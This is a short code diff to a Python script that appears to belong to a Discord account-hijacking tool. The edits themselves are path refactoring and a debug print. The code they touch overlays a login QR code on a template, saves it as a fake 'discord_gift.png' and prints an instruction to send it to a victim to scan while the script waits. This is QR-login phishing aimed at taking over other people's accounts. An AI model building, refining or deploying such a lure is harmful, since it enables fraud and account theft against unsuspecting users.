@@ -8,16 +8,17 @@ from dtg import utitlites
 
 
 def logo_qr():
-    im1 = Image.open('image/qr_code.png', 'r')
-    im2 = Image.open('image/overlay.png', 'r')
+    im1 = Image.open(os.path.join('image', 'qr_code.png'), 'r')
+    im2 = Image.open(os.path.join('image', 'overlay.png'), 'r')
     im2_w, im2_h = im2.size
     im1.paste(im2, (60, 55))
-    im1.save('image/final_qr.png', quality=95)
+    im1.save(os.path.join('image', 'final_qr.png'), quality=95)
 
 
 def paste_template():
-    im1 = Image.open('image/template.png', 'r')
-    im2 = Image.open('image/final_qr.png', 'r')
+    print("STARTING FUNCTION 1")
+    im1 = Image.open(os.path.join('image', 'template.png'), 'r')
+    im2 = Image.open(os.path.join('image', 'final_qr.png'), 'r')
     im1.paste(im2, (120, 409))
     im1.save('discord_gift.png', quality=95)
 
@@ -80,7 +81,7 @@ def main():
     logo_qr()
     paste_template()
 
-    print('+ QR Code has been generated > images/discord_gift.png')
+    print('+ QR Code has been generated > ./discord_gift.png')
     print('+ Send the QR Code to user and scan. Waiting...')
 
     while True:
